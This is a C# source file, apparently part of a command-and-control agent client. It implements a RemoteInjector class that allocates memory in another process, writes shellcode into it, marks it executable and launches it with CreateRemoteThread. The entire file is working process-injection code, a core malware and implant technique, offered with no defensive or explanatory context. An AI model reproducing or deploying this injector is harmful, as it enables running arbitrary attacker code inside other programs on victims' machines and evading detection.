using AgentClient.Infrastructure.Native;
using System.Diagnostics;

namespace AgentClient.Application.Services.InjectService
{
    public class RemoteInjector : InjectorService
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            if (shellcode == null || shellcode.Length == 0)
            {
                throw new ArgumentException("Shellcode cannot be empty or null", nameof(shellcode));
            }

            if (pid <= 0)
            {
                throw new ArgumentOutOfRangeException(nameof(pid), "PID value must be greater than 0");
            }

            IntPtr threadId;
            var tProcess = Process.GetProcessById(pid);
            // TODO: ADD EXCEPTIONS
            try
            {
                var baseAddress = Kernel32.VirtualAllocEx(
                    tProcess.Handle,
                    IntPtr.Zero,
                    shellcode.Length,
                    Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                    Kernel32.MemoryProtection.ReadWrite
                    );

                Kernel32.WriteProcessMemory(
                    tProcess.Handle,
                    baseAddress,
                    shellcode,
                    shellcode.Length,
                    out _);

                Kernel32.VirtualProtectEx(
                    tProcess.Handle,
                    baseAddress,
                    shellcode.Length,
                    Kernel32.MemoryProtection.ExecuteRead,
                    out _);

                Kernel32.CreateRemoteThread(
                    tProcess.Handle,
                    IntPtr.Zero,
                    0,
                    baseAddress,
                    IntPtr.Zero,
                    0,
                    out threadId);

                if (threadId == IntPtr.Zero)
                {
                    return false;
                }

                return true;
            }
            catch (Exception)
            {
                return false;
            }
            finally
            {
                tProcess.Dispose();
            }
        }
    }
}
